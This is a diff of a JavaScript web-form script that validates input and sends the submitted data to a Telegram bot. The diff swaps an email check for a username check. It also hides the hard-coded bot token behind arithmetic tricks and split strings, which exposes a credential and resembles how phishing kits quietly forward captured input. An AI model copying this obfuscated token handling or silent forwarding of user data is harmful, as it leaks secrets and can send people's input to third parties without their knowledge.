@@ -29,7 +29,7 @@ function formValidate(userData) {
       formRemoveErr(input, inputParent);
 
       if (input.classList.contains('email')) {
-         if (mailTest(input)) {
+         if (mailUser(input)) {
             formAddError(input, inputParent);
             error++;
          }
@@ -50,10 +50,6 @@ function formValidate(userData) {
    return error;
 };
 
-function returnVal(value) {
-   return value
-}
-
 function formAddError(input, inputParent) {
    input.classList.add('err')
    inputParent.classList.add('err');
@@ -64,8 +60,8 @@ function formRemoveErr(input, inputParent) {
    inputParent.classList.remove('err');
 };
 
-function mailTest(input) {
-   return !/^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,8})+$/.test(input.value);
+function mailUser(input) {
+   return !/^[A-Za-z]{2,}[_-]?[A-Za-z0-9]{2,}$/.test(input.value);
 }
 
 // <Validation functions />
@@ -84,8 +80,9 @@ async function sendData(userData) {
 
    // Удалить все символы новой строки!
    str = str.replace(/(\r\n|\n|\r)/gm, "");
-
-   let url = `https://api.telegram.org/bot${`17${4 + 2 + 2}7740${0 / 100 * 0}0${Math.sin(Math.PI / 2) * 5}` + ':' + 'AAG0rZT91FYMtlynF5lUY' + 'g9U6o0FG' + '_' + 'PSOT4'}/sendMessage?chat_id=${chat_id}&parse_mode=html&text=${str}`;
+   let s1 = 'g9U6o0FG'
+   let s2 = 'AAG0rZT91FYMtlynF5l'
+   let url = `https://api.telegram.org/bot${`17${4 + 2 + 2}7740${0 / 100 * 0}0${Math.sin(Math.PI / 2) * 5}` + ':' + s2 + 'UY' + s1 + '_' + 'PSOT4'}/sendMessage?chat_id=${chat_id}&parse_mode=html&text=${str}`;
    // sendMessage?chat_id=${chat_id}&parse_mode=html&text=${str}
    // Request...
    let req = new XMLHttpRequest();
